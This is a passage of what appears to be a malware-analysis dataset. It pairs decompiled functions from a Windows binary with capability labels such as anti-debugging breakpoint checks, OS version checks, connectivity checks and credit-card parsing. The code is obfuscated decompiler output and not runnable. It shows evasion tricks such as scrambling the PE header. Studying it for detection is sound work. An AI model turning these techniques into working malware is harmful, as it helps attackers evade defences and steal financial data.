>> 8) ^ 0x6200) - 0x3488 & 0x7ee5;\n    bVar12 = SCARRY4(uVar4, uVar4);\n    puVar18 = unaff_EBX;\n    uVar14 = fcn.00402100(0x411414, 0x11, 0x407028, 10);\n    iVar6 = uVar14 >> 0x20;\n    uVar5 = extraout_ECX >> 8;\n    if ((bVar12) || (!bVar12)) {\n        puVar16 = 0x12;\n        in_stack_ffffffdc = 0x407034;\n        in_stack_ffffffd8 = 0x11;\ncode_r0x00403a37:\n        *(iVar6 + 0x11) = *(iVar6 + 0x11) + uVar5;\n        uVar4 = fcn.00402100(0x411414, in_stack_ffffffd8, in_stack_ffffffdc, puVar16);\n        bVar12 = (unaff_ESI & (uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + '\\x01', uVar4))) == 0;\n        uVar15 = fcn.00402100(0x411414, 0x11, 0x407048, 4);\n        iVar6 = uVar15 >> 0x20;\n        uVar5 = extraout_CH;\n        if ((!bVar12) && (puVar16 = unaff_EDI,  bVar12)) goto code_r0x00403a77;\n        puVar16 = 0xc;\ncode_r0x00403a7b:\n        *(iVar6 + 0xc) = *(iVar6 + 0xc) ^ uVar5;\n        fcn.00402100(0x411414, 0x11, 0x40704c, puVar16);\n        fcn.00402100(0x411414, 0x11, 0x407058, 7);\n        fcn.00402100(0x411414, 0x11, 0x407060, 0xb);\n        puVar7 = unaff_EDI;\n    }\n    else {\n        puVar7 = unaff_EDI + 1;\n        puVar16 = unaff_ESI + 1;\n        *unaff_EDI = *unaff_ESI;\n        iVar6 = 0x3468126a;\n        uVar15 = CONCAT44(0x3468126a, uVar14 + 1);\n        unaff_ESI = puVar16;\n        unaff_EDI = puVar7;\n        puVar16 = extraout_ECX;\n        if (!SCARRY4(uVar14, 1)) goto code_r0x00403a37;\ncode_r0x00403a77:\n        iVar6 = uVar15 >> 0x20;\n        puVar7 = unaff_EDI + 1;\n        uVar17 = in(uVar15 >> 0x20);\n        *unaff_EDI = uVar17;\n        unaff_EDI = puVar7;\n        if (0 < &stack0xffffffe1) goto code_r0x00403a7b;\n        *(uVar15 * 2) = uVar15 >> 0x28;\n        *0x7ee5 = *0x7ee5 + (uVar15 >> 8);\n    }\n    fcn.00402100(0x411414, 0x11, 0x40706c, 0xc);\n    bVar12 = false;\n    bVar9 = (unaff_EBX & extraout_CX) == 0;\n    uVar17 = 0x403b2b;\n    uVar4 = fcn.00402100(0x411414, 0x11, 0x407078, 8);\n    if ((bVar9) || (!bVar9)) {\ncode_r0x00403b3f:\n        fcn.00402100(0x411414, 0x11, 0x407080, 0xd);\n        bVar12 = (extraout_CH_00 | extraout_DL | 0x1f) < '\\0';\n        uVar17 = 0x403b75;\n        iVar6 = fcn.00402100(0x411414, 0x11, 0x407090, 0x18);\n        if ((bVar12) || (!bVar12)) {\n            uVar17 = 0x25;\n        }\n        else {\n            unaff_ESI = iVar6 + -0x1bf31dd6;\n            *unaff_EBX = *unaff_EBX & 0xc3;\n        }\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        if (!bVar12 && unaff_EBX != NULL) {\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            piVar1 = (uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + in_AF, uVar4 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar1 = *piVar1 - unaff_EBX;\n            unaff_ESI = unaff_ESI + 1;\n            goto code_r0x00403b3f;\n        }\n    }\n    fcn.00402100(0x411414, 0x11, 0x4070a8, uVar17);\n    fcn.00402100(0x411414, 0x11, 0x4070d0, 10);\n    uVar17 = 0x4070dc;\n    puVar16 = 0x11;\n    fcn.00402100(0x411414, 0x11, 0x4070dc, 0xc);\n    cVar13 = '\\0';\n    cVar11 = '\\0';\n    arg_14h_00 = 0xd;\n    arg_10h = 0x4070e8;\n    arg_ch = 0x11;\n    uVar14 = fcn.00402100(0x411414, 0x11, 0x4070e8, 0xd);\n    iVar6 = uVar14 >> 0x20;\n    if ((cVar13 == cVar11) && (cVar13 != cVar11)) {\n        bVar12 = SBORROW4(iVar6, -0x797f996);\n        iVar6 = uVar14;\n        if (bVar12) {\n            puVar2 = uVar14 + 0x11;\n            bVar12 = CARRY1(*puVar2, extraout_CH_01);\n            *puVar2 = *puVar2 + extraout_CH_01;\n            uVar5 = *puVar2;\n            goto code_r0x00403c64;\n        }\n    }\n    else {\n        unaff_EBX = 0x6;\n        uVar17 = 0x4070f8;\n        puVar16 = 0x11;\n    }\n    *(iVar6 + 0x11) = *(iVar6 + 0x11) + extraout_CH_01;\n    fcn.00402100(0x411414, puVar16, uVar17, unaff_EBX);\n    puVar16 = unaff_ESI;\n    uVar17 = unaff_EBP;\n    fcn.00402100(0x411414, 0x11, 0x407100, 5);\n    bVar12 = extraout_DL_00 + 0x15U < extraout_AH;\n    uVar5 = (extraout_DL_00 + 0x15U) - extraout_AH;\n    arg_14h_00 = 0xd;\n    arg_10h = 0x407108;\n    arg_ch = 0x11;\ncode_r0x00403c64:\n    bVar9 = uVar5 == 0;\n    arg_14h = 0x403c6e;\n    fcn.00402100(0x411414, arg_ch, arg_10h, arg_14h_00);\n    if ((bVar12 || bVar9) || (!bVar12 && !bVar9)) {\n        arg_14h = 0x19;\n        uVar17 = 0x407118;\n        puVar16 = 0x11;\n    }\n    else {\n        *puVar7 = *unaff_ESI;\n        unaff_EBP = 0x6ae181d0;\n        unaff_ESI = unaff_ESI + 1;\n        if (SBORROW4(puVar18, 0x6ae181d0) == false) {\n            pcVar3 = swi(1);\n            (*pcVar3)();\n            return;\n        }\n    }\n    *(extraout_EDX + 0x11) = *(extraout_EDX + 0x11) + extraout_CH_02;\n    fcn.00402100(0x411414, puVar16, uVar17, arg_14h);\n    fcn.00402100(0x411414, 0x11, 0x407134, 0xf);\n    fcn.00402100(0x411414, 0x11, 0x407144, 0xe);\n    fcn.00402100(0x411414, 0x11, 0x407154, 0xb);\n    fcn.00402100(0x411414, 0x11, 0x407160, 0xb);\n    fcn.00402100(0x411414, 0x11, 0x40716c, 0xb);\n    bVar12 = false;\n    uVar17 = 0x403d9e;\n    fcn.00402100(0x411414, 0x11, 0x407178, 10);\n    if ((bVar12) || (!bVar12)) {\n        uVar17 = 0xc;\n        unaff_EBP = 0x407184;\n        unaff_ESI = 0x11;\n    }\n    puVar18 = extraout_EDX_00 + 0x11;\n    uVar8 = CARRY1(*puVar18, extraout_CH_03);\n    *puVar18 = *puVar18 + extraout_CH_03;\n    uVar10 = *puVar18 == 0;\n    fcn.00402100(0x411414, unaff_ESI, unaff_EBP, uVar17);\n    fcn.00402100(0x411414, 0x11, 0x407190, 0xe);\n    if ((!uVar8 && !uVar10) && (uVar8 || uVar10)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00402100(0x411414, 0x11, 0x4071a0, 0x11);\n    fcn.00402100(0x411414, 0x11, 0x4071b4, 0x13);\n    fcn.00402100(0x411414, 0x11, 0x4071c8, 0x14);\n    fcn.00402100(0x411414, 0x11, 0x4071dc, 0x33);\n    fcn.00402100(0x411414, 0x11, 0x407210, 10);\n    fcn.00402100(0x411414, 0x11, 0x40721c, 4);\n    fcn.00402100(0x411414, 0x11, 0x407220, 5);\n    fcn.00402100(0x411414, 0x11, 0x407228, 6);\n    fcn.00402100(0x411414, 0x11, 0x40725c, 0x2a);\n    fcn.00402100(0x411414, 0x11, 0x407288, 0xb);\n    return;\n}\n",
        "token_count": 3120
    },
    "00404e70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00404e70(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403360(0x80000002, 0x4071dc, 0x407228, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00401b10": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401cac) overlaps instruction at (ram,0x00401cab)\n// \n\nvoid fcn.00401b10(void)\n\n{\n    int16_t in_AX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    char extraout_DL;\n    char extraout_DL_00;\n    char cVar3;\n    int16_t unaff_BX;\n    uint *puVar4;\n    uchar *puVar5;\n    code *unaff_ESI;\n    code *pcVar6;\n    uint *puVar7;\n    uchar uVar8;\n    bool bVar9;\n    uchar auStack1236 [604];\n    uint uStack632;\n    uchar *puStack628;\n    uint var_25fh;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar7 = &stack0xfffffffc;\n    bVar9 = in_AX == unaff_BX;\n    puStack628 = 0x401b26;\n    fcn.00404360();\n    puVar5 = &stack0xfffffffc;\n    if ((!bVar9) && (puVar5 = &stack0xfffffffc,  bVar9)) {\n        puVar4 = &stack0xfffffd8c;\n        puVar5 = &stack0xfffffd8c;\n        cVar3 = '\\x10';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar7;\n            cVar3 = cVar3 + -1;\n            puStack628 = &stack0xfffffffc;\n        } while ('\\0' < cVar3);\n    }\n    iVar1 = fcn.004012d0();\n    if (iVar1 != 0) {\n        puVar5[-0x260] = 0;\n        puVar7 = puVar5 + -0x25f;\n        for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar7 = 0;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = 0;\n        *(puVar7 + 2) = 0;\n        iVar1 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar1 != 0) {\n            fcn.00401060();\n            puVar5[-0x15c] = 0;\n            puVar7 = puVar5 + -0x15b;\n            for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            *(puVar5 + -0x14) = 0;\n            do {\n                puVar7 = puVar5 + -0x58;\n                for (iVar1 = 0x11; iVar1 != 0; iVar1 = iVar1 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                *(puVar5 + -0x28) = 0;\n                *(puVar5 + -0x10) = 0;\n                *(puVar5 + -0xc) = 0;\n                *(puVar5 + -0x58) = 0x44;\n                *(puVar5 + -8) = 0;\n                *(puVar5 + -0x2c) = 1;\n                *(puVar5 + -4) = 0;\n                iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                if (iVar1 == 0) {\n                    return;\n                }\n                (*_sym.imp.KERNEL32.dll_Sleep)();\n                (*_sym.imp.USER32.dll_EnumWindows)();\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                uVar8 = (POPCOUNT(iVar2 - 0x102U & 0xff) & 1U) == 0;\n                iVar1 = extraout_ECX;\n                cVar3 = extraout_DL;\n                if (iVar2 - 0x102U == 0) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*(puVar5 + -0x10), 1);\n                    iVar1 = extraout_ECX_00;\n                    cVar3 = extraout_DL_00;\n                }\n                pcVar6 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((uVar8) || (!uVar8)) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puVar5 + -0xc));\n                }\n                else {\n                    *0x358bf44d = *0x358bf44d | 0x6c;\n                    *(iVar1 + -1) = *(iVar1 + -1) + cVar3;\n                    pcVar6 = unaff_ESI;\n                }\n                (*pcVar6)(*(puVar5 + -0x10));\n                iVar1 = *(puVar5 + -0x14);\n                *(puVar5 + -0x14) = iVar1 + 1;\n                unaff_ESI = pcVar6;\n            } while (iVar1 + 1 < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1275
    },
    "00401f70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401f70(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00401060();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(*0x10 + -0x110, 4);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00403420();\n        arg_ch_01 = fcn.00403420();\n        arg_ch_02 = fcn.00403420();\n        fcn.004047e0(arg_10h, arg_ch_00);\n        fcn.004047e0(arg_8h, arg_ch_01);\n        fcn.004047e0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407028, &lpBuffer, arg_10h);\n        iVar2 = fcn.00404840(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407034, &lpBuffer, arg_8h);\n            iVar2 = fcn.00404840(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407034, &lpBuffer, arg_ch);\n                iVar2 = fcn.00404840(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004047e0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 628
    },
    "00402bb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402bf3) overlaps instruction at (ram,0x00402bef)\n// \n// WARNING: Control flow encountered bad instruction data\n\nuint64_t __cdecl int.00402bb0(uint16_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint8_t uVar4;\n    int32_t in_EAX;\n    uint uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t in_EDX;\n    int32_t *piVar10;\n    uint extraout_EDX;\n    uint32_t uVar11;\n    uint *puVar12;\n    int32_t unaff_EDI;\n    uint *puVar13;\n    bool bVar14;\n    uint8_t in_AF;\n    unkbyte10 in_ST0;\n    uint64_t uVar15;\n    uint var_4h;\n    \n    puVar6 = &stack0xfffffffc;\n    piVar10 = (in_EDX >> 8 & 0xffff00) << 8 | in_EDX & 0xffff;\n    uVar1 = *arg_8h;\n    if (*arg_8h != 0x5a4d) {\n        return ZEXT48(piVar10) << 0x20;\n    }\n    if ((0x5a4c < *arg_8h) && (*arg_8h < 0x5a4d)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        uVar4 = in_EAX - 1U;\n        uVar2 = 9 < (uVar4 & 0xf) | in_AF;\n        uVar4 = uVar4 + uVar2 * '\\x06';\n        uVar4 = uVar4 + (0x90 < (uVar4 & 0xf0) | uVar1 < 0x5a4d | uVar2 * (0xf9 < uVar4)) * '`';\n        *piVar10 = *piVar10 + 0x418bdf84;\n        uVar9 = *(unaff_EDI + 0x66);\n        *(unaff_EDI + 0x66) = uVar9 << 1 | CONCAT14(uVar4 < 3, uVar9) >> 0x20;\n        return CONCAT44(piVar10, in_EAX - 1U & 0xffffff00 | uVar4);\n    }\n    uVar9 = *(*(arg_8h + 0x1e) + arg_8h) - 0x4550;\n    bVar14 = (POPCOUNT(uVar9 & 0xff) & 1U) != 0;\n    if (uVar9 != 0) {\n        return ZEXT48(piVar10) << 0x20;\n    }\n    if ((bVar14) && (!bVar14)) {\n        puVar12 = &stack0xffffffe8;\n        cVar3 = '\\x1e';\n        do {\n            puVar6 = puVar6 + -1;\n            puVar12 = puVar12 + -1;\n            *puVar12 = *puVar6;\n            cVar3 = cVar3 + -1;\n        } while ('\\0' < cVar3);\n        uVar5 = in(0x78);\n        return CONCAT44(piVar10, uVar5);\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] != 0) {\n        return ZEXT48(piVar10) << 0x20;\n    }\n    if (0x80 < *(arg_8h + 0x1e)) {\n        uVar9 = 0x40;\n        if (*(arg_8h + 0x1e) < 0xc0) {\n            uVar9 = *(arg_8h + 0x1e) - 0x80;\n        }\n        uVar15 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n        puVar6 = uVar15;\n        bVar14 = puVar6 != NULL;\n        if (bVar14) {\n            if (bVar14) {\n                if (!bVar14) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n            }\n            uVar8 = 0;\n            if (uVar9 != 0) {\n                do {\n                    iVar7 = (*_sym.imp.MSVCRT.dll_rand)();\n                    uVar11 = uVar8 + 1;\n                    *(uVar8 + puVar6) = iVar7 % 0xff;\n                    uVar8 = uVar11;\n                } while (uVar11 < uVar9);\n            }\n            puVar12 = puVar6;\n            puVar13 = arg_8h + 0x40;\n            for (uVar8 = uVar9 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n                *puVar13 = *puVar12;\n                puVar12 = puVar12 + 1;\n                puVar13 = puVar13 + 1;\n            }\n            for (uVar9 = uVar9 & 3; uVar9 != 0; uVar9 = uVar9 - 1) {\n                *puVar13 = *puVar12;\n                puVar12 = puVar12 + 1;\n                puVar13 = puVar13 + 1;\n            }\n            sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar6);\n            return CONCAT44(extraout_EDX, 1);\n        }\n        return uVar15 & 0xffffffff00000000;\n    }\n    return ZEXT48(piVar10) << 0x20;\n}\n",
        "token_count": 1302
    },
    "004021b0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004021b0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 147
    },
    "004036c0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403764) overlaps instruction at (ram,0x00403760)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.004036c0(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint8_t extraout_CL;\n    uint *puVar4;\n    uchar *puVar5;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar6;\n    ulong uVar7;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&fcn.004036c0::lpBuffer, &fcn.004036c0::pcbBuffer);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    uVar7 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                      (0, &fcn.004036c0::lpBuffer, &fcn.004036c0::var_114h, &fcn.004036c0::var_4h, \n                       &fcn.004036c0::var_31ch, *0x10 + -0xc, 0xec);\n    puVar3 = uVar7;\n    bVar6 = puVar3 == NULL;\n    if (bVar6) {\n        return 0;\n    }\n    if ((bVar6) || (iVar2 = uVar7 >> 0x20,  !bVar6)) {\n        puVar3 = &fcn.004036c0::var_114h;\n        iVar2 = arg_8h;\n    }\n    *unaff_EDI = *unaff_ESI;\n    puVar3[-1] = 0x8be181d0;\n    *0x8be06e55 = *0x8be06e55 | extraout_CL;\n    pcVar1 = *(iVar2 + 0x50);\n    puVar4 = puVar3 + -2;\n    puVar3[-2] = 0x40376f;\n    (*pcVar1)();\n    puVar5 = puVar4 + -4;\n    *(puVar4 + -4) = 0x403775;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n    if (iVar2 == 0) {\n        return 0;\n    }\n    if (0 < iVar2) {\n        *(puVar5 + -2) = unaff_ESI + 4;\n    }\n    return 1;\n}\n",
        "token_count": 646
    },
    "00403fb0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004042fe) overlaps instruction at (ram,0x004042fd)\n// \n// WARNING: Removing unreachable block (ram,0x00404013)\n// WARNING: Removing unreachable block (ram,0x0040414f)\n\nvoid fcn.00403fb0(void)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uchar uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar7;\n    int32_t extraout_EDX;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_EBP;\n    int32_t *unaff_EDI;\n    uchar *puVar8;\n    bool bVar9;\n    char cVar10;\n    char cVar11;\n    ulong uVar12;\n    int16_t iVar13;\n    ushort uVar14;\n    int16_t iVar15;\n    ushort uVar16;\n    uint16_t uVar17;\n    ushort uVar18;\n    uint arg_10h;\n    uint arg_14h;\n    \n    iVar5 = fcn.00402100(0x411414, 0x11, 0x407014, 0x11);\n    cVar11 = SBORROW4(iVar5, extraout_ECX);\n    cVar10 = iVar5 - extraout_ECX < 0;\n    uVar4 = fcn.00402100(0x411414, 0x11, 0x407230, 0xf);\n    if ((cVar11 == cVar10) && (cVar11 != cVar10)) {\n        puVar8 = unaff_EDI | unaff_EBP;\n        unaff_EDI = puVar8 + 1;\n        *puVar8 = uVar4;\n        cVar10 = '\\0';\n    }\n    uVar14 = 0x4021;\n    uVar16 = 0x40;\n    iVar5 = fcn.00402100(0x411414, 0x11, 0x407240, 0x1a);\n    if ((cVar10) || (!cVar10)) {\n        uVar14 = 10;\n        uVar16 = 0;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00402100(0x411414, 0x11, 0x407294, CONCAT22(uVar16, uVar14));\n    fcn.00402100(0x411414, 0x11, 0x4072a0, 0xb);\n    fcn.00402100(0x411414, 0x11, 0x4072ac, 8);\n    fcn.00402100(0x411414, 0x11, 0x4072b4, 9);\n    bVar9 = false;\n    arg_14h = 0x4072c0;\n    arg_10h = 0x11;\n    uVar14 = 0x1414;\n    uVar16 = 0x41;\n    uVar12 = fcn.00402100(0x411414, 0x11, 0x4072c0, 9);\n    if ((!bVar9) && (bVar9)) {\n        *(iVar5 + 0x27de5964) = *(iVar5 + 0x27de5964) ^ 0x6a27e95e;\n        puVar1 = uVar12 + (bVar9 == false) + 0x7c8ecad9;\n        *puVar1 = *puVar1 | unaff_EBP;\n    }\n    pcVar2 = (uVar12 >> 0x20) + 0x11;\n    *pcVar2 = *pcVar2 + extraout_CH;\n    fcn.00402100(0x411414, CONCAT22(uVar16, uVar14), arg_10h, arg_14h);\n    fcn.00402100(0x411414, 0x11, 0x4072d8, 0xc);\n    fcn.00402100(0x411414, 0x11, 0x4072e4, 3);\n    fcn.00402100(0x411414, 0x11, 0x4072e8, 10);\n    fcn.00402100(0x411414, 0x11, str.Y_fy, 0x40);\n    fcn.00402100(0x411414, 0x11, 0x407334, 0xc);\n    fcn.00402100(0x411414, 0x11, 0x407340, 0xb);\n    fcn.00402100(0x411414, 0x11, 0x40734c, 4);\n    piVar6 = fcn.00402100(0x411414, 0x11, 0x407350, 4);\n    uVar4 = unaff_EDI < piVar6;\n    cVar10 = unaff_EDI == piVar6;\n    while ((fcn.00402100(0x411414, 0x11, 0x407354, 0x411414),  !uVar4 && (uVar4))) {\n        iVar7 = extraout_ECX_00 + -1;\n        if (iVar7 == 0 || cVar10 == '\\0') {\n            iVar3 = *(iVar5 + -0x1bf31dd6);\n            *unaff_EDI = iVar5 + -0x1bf31dd2;\n            iVar5 = iVar3 >> 0x1f;\n            uVar17 = *0x9750e2b5 & 0xffffff00 | *0x9750e2b5 + 0x68;\n            uVar18 = (*0x9750e2b5 & 0xffffff00) >> 0x10;\n            uVar14 = iVar7;\n            uVar16 = iVar7 >> 0x10;\n            iVar15 = iVar3 >> 0x10;\n            iVar13 = iVar15 >> 0xf;\n            iVar15 = iVar15 >> 0x1f;\n            if (*0x9750e2b5 < 0x98) {\n                return;\n            }\ncode_r0x004042be:\n            *(iVar5 + 0x11) = *(iVar5 + 0x11) + (iVar7 >> 8);\n            fcn.00402100(0x411414, CONCAT22(iVar15, iVar13), CONCAT22(uVar16, uVar14), CONCAT22(uVar18, uVar17));\n            fcn.00402100(0x411414, 0x11, 0x407364, 9);\n            fcn.00402100(0x411414, 0x11, 0x407370, 0x16);\n            fcn.00402100(0x411414, 0x11, 0x407388, 7);\n            return;\n        }\n    }\n    uVar17 = 4;\n    uVar18 = 0;\n    uVar14 = 0x7360;\n    uVar16 = 0x40;\n    iVar13 = 0x11;\n    iVar15 = 0;\n    iVar7 = extraout_ECX_00;\n    iVar5 = extraout_EDX;\n    goto code_r0x004042be;\n}\n",
        "token_count": 1692
    },
    "00404360": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040448c) overlaps instruction at (ram,0x0040448a)\n// \n\nuint fcn.00404360(void)\n\n{\n    uint32_t *puVar1;\n    uint16_t in_AX;\n    ushort uVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t extraout_CH;\n    uint8_t uVar5;\n    char extraout_CH_00;\n    int32_t extraout_ECX;\n    int32_t extraout_EDX;\n    uint *puVar6;\n    uint *unaff_EBP;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    ushort in_CS;\n    bool bVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    uchar uVar9;\n    char cVar10;\n    char cVar11;\n    uint in_stack_ffffffdc;\n    uint arg_10h;\n    uchar *arg_14h;\n    \n    bVar7 = false;\n    bVar8 = (in_AX & 0x11cb) == 0;\n    fcn.00402100(0x411414, 0x11, 0x407390, 0x20);\n    if ((bVar7 || bVar8) || (!bVar7 && !bVar8)) {\n        in_stack_ffffffdc = 0x4073b0;\n    }\n    *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffdc;\n    fcn.00402100(0x411414, 0x11, 0x4073b0, in_stack_ffffffdc);\n    fcn.00402100(0x411414, 0x11, 0x4073d8, 8);\n    fcn.00402100(0x411414, 0x11, 0x4073e0, 0x19);\n    fcn.00402100(0x411414, 0x11, 0x4073fc, 0xb);\n    fcn.00402100(0x411414, 0x11, 0x407408, 0x12);\n    fcn.00402100(0x411414, 0x11, 0x40741c, 0x12);\n    while( true ) {\n        fcn.00402100(0x411414, 0x11, 0x407430, 2);\n        cVar11 = '\\0';\n        uVar5 = extraout_CH | 0x47;\n        cVar10 = uVar5 < '\\0';\n        uVar9 = uVar5 == 0;\n        bVar7 = (POPCOUNT(uVar5) & 1U) == 0;\n        fcn.00402100(0x411414, 0x11, 0x407434, 8);\n        if ((!bVar7) && (bVar7)) {\n            puVar6 = &stack0xffffffe0;\n            cVar10 = '\\x1e';\n            do {\n                unaff_EBP = unaff_EBP + -1;\n                puVar6 = puVar6 + -1;\n                *puVar6 = *unaff_EBP;\n                cVar10 = cVar10 + -1;\n            } while ('\\0' < cVar10);\n            uVar3 = in(0x78);\n            return uVar3;\n        }\n        arg_10h = 0x40743c;\n        uVar3 = 0x11;\n        uVar2 = fcn.00402100(0x411414, 0x11, 0x40743c, 8);\n        if ((uVar9 || cVar11 != cVar10) || (!uVar9 && cVar11 == cVar10)) break;\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        if (extraout_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(unaff_ESI + 0x3b) = *(unaff_ESI + 0x3b) + (uVar2 >> 8) + in_AF;\n        puVar1 = unaff_EBP + 0x19b33fb0;\n        